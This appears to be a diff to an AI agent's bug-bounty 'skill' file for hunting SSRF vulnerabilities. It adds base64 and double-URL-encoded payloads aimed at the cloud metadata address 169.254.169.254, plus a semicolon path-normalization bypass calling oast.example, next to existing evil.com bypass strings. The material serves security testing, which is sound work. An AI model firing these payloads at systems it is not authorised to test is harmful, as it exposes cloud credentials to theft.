@@ -2,7 +2,7 @@
 name: hunt-ssrf
 description: Hunting skill for ssrf vulnerabilities. Built from 15 public bug bounty reports including AWS metadata SSRF (HackerOne $25k Analytics PDF, Shopify Exchange $25k, Capital One 106M-record breach, Dropbox/HelloSign $4,913), GCP metadata SSRF (Snapchat $4k), Azure IMDS SSRF (Azure DevOps $15k chain, ChatGPT Custom Actions MSRC), DNS rebinding SSRF (Concrete CMS, GitLab UrlBlocker), gopher-protocol-to-Redis-RCE (Yahoo Mail $15k), link-preview SSRF (Reddit Matrix $6k), and headless-browser PDF-generator SSRF chains. Use when hunting SSRF on any target — OOB Collaborator confirmation mandatory for blind cases.
 sources: github, hackerone_public, portswigger_research, binarysecurity_research
-report_count: 15
+report_count: 34
 ---
 
 ## Crown Jewel Targets
@@ -387,6 +387,28 @@ https://allowlisted-domain.com → HTTP 301 → http://169.254.169.254/
 http://Localhost/
 http://127.0.0.1%2F@evil.com/
 ```
+
+### App-layer input-encoding bypass (filter sees one thing, fetcher another)
+When the endpoint takes the target URL **wrapped/encoded** — a base64 blob in the path, a
+double-encoded param, a JSON-nested value — the front-end WAF/allowlist inspects the *raw*
+input while the backend **decodes it before fetching**. Encode the internal target so the
+filter never sees `169.254` / `localhost` in clear:
+```
+# target URL base64'd into a path segment the app decodes, then fetches
+GET /proxy/aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8=/x.js   # = http://169.254.169.254/  (disclosed: reports/1189367)
+# double-URL-encode the host so one decode pass survives the filter
+url=http%253A%252F%252F169.254.169.254%252F
+```
+Always test whether the parameter is decoded once, twice, or base64'd before the fetch — the number of decode passes is the bug.
+
+### Path-normalization / semicolon bypass (front-end filter vs origin path)
+A front-end that blocks `url=` to internal hosts can be skipped when the origin re-normalizes
+path segments the edge left intact — inject `;/`, `/../`, or matrix-param segments so the edge
+routes it as benign but the origin resolves the SSRF fetch:
+```
+GET /;/;/resource/md/get/url?url=http://oast.example/   # edge ignores, origin fetches (disclosed: reports/2035332)
+```
+Full-read SSRF via this path-confusion reaches cloud-credential endpoints the direct `url=` param blocked.
 
 ### Schema/Protocol Bypasses
 ```
